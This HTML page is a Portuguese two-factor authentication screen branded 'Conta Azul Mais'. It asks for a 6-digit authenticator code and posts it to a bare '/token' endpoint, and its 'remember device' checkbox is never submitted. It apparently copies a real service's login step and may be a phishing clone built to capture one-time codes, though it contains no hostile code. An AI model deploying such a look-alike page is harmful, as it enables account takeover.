<!doctype html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conta Azul Mais - Autenticação</title>
<link rel="icon" href="/static/img/favicon.ico">

<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  body, html {
    height: 100%;
    font-family: Arial, sans-serif;
  }
  .split {
    display: flex;
    height: 100vh;
  }
  /* Lado esquerdo */
  .left {
    flex: 1;
    max-width: 33.33%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 40px;
    background-color: #fff;
  }
  .logo {
    width: 180px;
    margin-bottom: 30px;
  }
  h2 {
    font-size: 1.3em;
    margin-bottom: 20px;
    text-align: left;
    width: 100%;
  }
  p {
    font-size: 0.9em;
    color: #333;
    margin-bottom: 15px;
    text-align: left;
    width: 100%;
  }
  form {
    display: flex;
    flex-direction: column;
    width: 100%;
  }
  label {
    font-weight: bold;
    margin-top: 10px;
  }
  input {
    padding: 10px;
    margin-top: 5px;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 1em;
  }
  .checkbox {
    margin-top: 10px;
    display: flex;
    align-items: center;
    font-size: 0.85em;
  }
  .checkbox input {
    margin-right: 8px;
  }
  .btn {
    background-color: #28a745;
    color: white;
    padding: 12px;
    margin-top: 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 1em;
    font-weight: bold;
  }
  .btn:hover {
    background-color: #218838;
  }
  .link-blue {
    display: block;
    margin-top: 15px;
    color: #007bff;
    font-size: 0.9em;
    text-decoration: none;
    text-align: center;
  }
  .link-blue:hover {
    text-decoration: underline;
  }
  /* Lado direito */
  .right {
    flex: 2;
    background: url('/static/img/imagem_lateral.png') no-repeat center center;
    background-size: cover;
  }
</style>
</head>
<body>
  <div class="split">
    <!-- Lado esquerdo -->
    <div class="left">
      <img src="/static/img/logo.png" class="logo" alt="ContaAzul">
      <h2>Confira o código no seu aplicativo de autenticação</h2>

      <p>Para ajudar a proteger sua conta, digite abaixo o <b>código de 6 dígitos</b> gerado pelo seu aplicativo de autenticação:</p>

      <form method="post" action="/token">
        <input id="token" name="token" type="number" maxlength="6" required autocomplete="off">

        <div class="checkbox">
          <input type="checkbox" id="lembrar">
          <label for="lembrar">Não pergunte novamente neste dispositivo</label>
        </div>

        <button type="submit" class="btn">Autenticar</button>
      </form>

      <a href="#" class="link-blue">Ajuda</a>
    </div>

    <!-- Lado direito -->
    <div class="right"></div>
  </div>
</body>
</html>
